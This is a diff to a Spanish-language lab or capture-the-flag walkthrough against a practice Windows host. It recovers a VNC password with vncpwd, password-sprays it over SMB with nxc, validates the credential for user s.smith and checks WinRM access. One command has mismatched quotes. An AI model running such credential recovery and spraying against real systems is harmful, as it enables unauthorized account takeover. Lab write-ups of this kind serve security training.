@@ -180,13 +180,43 @@ git clone https://github.com/jeroennijhof/vncpwd.git
 ```
 
 Ejecutamos el comando `make` para compilarlo
-Y ejecutaremos la herramienta usando
+
+La contraseña en hexadecimal la desencriptamos y la guardamos en un archivo llamado `password`
 ```shell
-./vncpwd 
+echo "6bcf2a4b6e5aca0f" | xxd -ps -r > password
 ```
 
+Y ejecutaremos la herramienta usando
+```shell
+./vncpwd password
+```
 
+Dándonos la contraseña en texto claro `sT333ve2`
+Como no sabemos a quien le pertenece la contraseña haremos un `USer Spraying`
 
+### User Spraying
+```shell
+nxc smb 10.129.9.250 -u users.txt -p 'sT333ve2' --continue-on-succes
+```
+
+Vemos que pertenece a `s.smith`
+Validamos que las credenciales sean validas
+```shell
+nxc smb 10.129.9.250 -u 's.smith -p 'sT333ve2
+```
+
+Son validas
+
+```ad-hint
+s.smith::sT333ve2
+```
+
+Vemos si pertenece al grupo de `Remote Management`
+```shell
+nxc winrm 10.129.9.250 -u 's.smith' -p 'sT333ve2'
+```
+
+Vemo
 
 
 
